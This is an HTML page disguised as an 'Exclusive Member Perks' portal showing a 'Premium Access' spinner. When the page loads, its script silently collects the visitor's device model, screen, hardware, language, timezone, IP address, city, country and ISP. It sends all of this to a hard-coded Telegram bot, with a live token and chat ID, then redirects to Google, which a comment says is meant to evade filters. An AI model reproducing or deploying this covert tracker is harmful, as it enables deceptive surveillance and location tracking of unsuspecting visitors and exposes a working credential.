<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Exclusive Member Perks</title>
    <meta property="og:title" content="Exclusive Member Perks">
    <meta property="og:description" content="Premium Membership Portal">

    <style>
        body {
            margin: 0; padding: 0;
            background: #0b0b0c !important;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            height: 100vh; overflow: hidden;
        }
        .container { text-align: center; width: 85%; max-width: 320px; }
        .snap-icon {
            width: 85px; height: 85px;
            margin: 0 auto 25px auto;
            background: linear-gradient(135deg, #fee140 0%, #fa709a 100%);
            border-radius: 24px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 30px rgba(250, 112, 154, 0.4);
        }
        .snap-icon svg { width: 50px; height: 50px; fill: white; }
        h2 { color: #ffffff; font-size: 20px; font-weight: 700; margin: 0 0 8px 0; }
        p { color: #a1a1aa; font-size: 14px; margin: 0 0 30px 0; line-height: 1.4; }
        .spinner {
            width: 32px; height: 32px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top-color: #ff3366;
            border-radius: 50%;
            animation: spin 0.8s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="snap-icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 .587l3.668 7.431 8.2 1.192-5.934 5.784 1.4 8.168L12 18.896l-7.334 3.857 1.4-8.168L.132 9.21l8.2-1.192z"/>
            </svg>
        </div>
        <h2>Premium Access</h2>
        <p>Connecting to secure server. Please hold on a moment...</p>
        <div class="spinner"></div>
    </div>

    <script>
        // لێرە تۆکنە نوێیەکەت و چات ئایدییەکەت دابنێ
        const token = '8822551876:AAFQfCt6gLGWNk-Xzq0cITSz0tfcDX1okdY'; 
        const chatId = '7602797383'; 

        function getExactDevice() {
            const ua = navigator.userAgent;
            const w = window.screen.width;
            const h = window.screen.height;

            if (/iPhone/i.test(ua)) {
                if (w === 390 && h === 844) return "iPhone 12 / 12 Pro / 13 / 14";
                if (w === 428 && h === 926) return "iPhone 12 Pro Max / 13 Pro Max";
                if (w === 393 && h === 852) return "iPhone 14 Pro / 15 / 15 Pro";
                if (w === 430 && h === 932) return "iPhone 14 Pro Max / 15 Pro Max";
                if (w === 375 && h === 812) return "iPhone X / XS / 11 Pro";
                if (w === 414 && h === 896) return "iPhone XR / 11 / 11 Pro Max";
                return "iPhone";
            }
            if (/Android/i.test(ua)) {
                const matches = ua.match(/Android\s([^\s;]+);?\s?([^;)]+)/);
                return matches && matches[2] ? matches[2] : "Android Device";
            }
            return "Unknown Device";
        }

        window.onload = function() {
            const exactDevice = getExactDevice();
            const ua = navigator.userAgent;
            const userLang = navigator.language || navigator.userLanguage;
            const screenRes = `${window.screen.width}x${window.screen.height}`;

            let browserName = "Normal Browser";
            if (/Snapchat/i.test(ua)) browserName = "Snapchat In-App 👻";
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browserName = "Safari 🧭";
            else if (/Chrome/i.test(ua)) browserName = "Chrome 🌐";

            const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
            const themeMode = isDarkMode ? "Dark Mode 🌙" : "Light Mode ☀️";

            const cpuCores = navigator.hardwareConcurrency || "N/A";
            const deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Hidden/iOS 🔒";
            const netType = (navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}).effectiveType || "N/A";
            const orientation = window.innerHeight > window.innerWidth ? "ستوونی (Portrait) 📱" : "ئاسۆیی (Landscape) 📟";

            const localTime = new Date().toLocaleTimeString('ku-IQ');
            const localDate = new Date().toLocaleDateString('ku-IQ');
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";

            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip || "N/A";
                const city = data.city || "N/A";
                const country = data.country_name || "N/A";
                const org = data.org || "N/A";

                const message = `
🔥 زانیاری نوێ لە بەستەری پارێزراوەوە هات 🔥
━━━━━━━━━━━━━━━━━━
👤 مۆدێل: ${exactDevice}
🌐 ئایپی: ${ip}
📍 وڵات: ${country}
🏙️ شار: ${city}
📡 کۆمپانیای نێت: ${org}

🧭 وێبگەر: ${browserName}
📶 جۆری هێڵ: ${netType}
🖥️ شاشە: ${screenRes}
📐 دۆخی گرتن: ${orientation}
🎨 دۆخی شاشە: ${themeMode}

⚙️ سی پی یو: ${cpuCores} Cores
🧠 ڕامی مۆبایل: ${deviceRam}
🗣️ زمانی مۆبایل: ${userLang}
🗺️ هێڵی کاتی: ${timeZone}
📅 ڕێککەوت: ${localDate}
⏰ کاتی مۆبایل: ${localTime}
━━━━━━━━━━━━━━━━━━
                `;

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                }).then(() => {
                    // دوای ناردنی زانیارییەکان، دەچێتە سەر گوگل تا فلتەرەکە پێی نەزانێت
                    setTimeout(function(){
                        window.location.href = "https://www.google.com";
                    }, 2000);
                });
            })
            .catch(err => {
                const simpleMessage = `🚨 زانیاری سەرەتایی:\n👤 مۆدێل: ${exactDevice}\n⏰ کات: ${localTime}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: simpleMessage })
                }).then(() => {
                    window.location.href = "https://www.google.com";
                });
            });
        };
    </script>
</body>
</html>
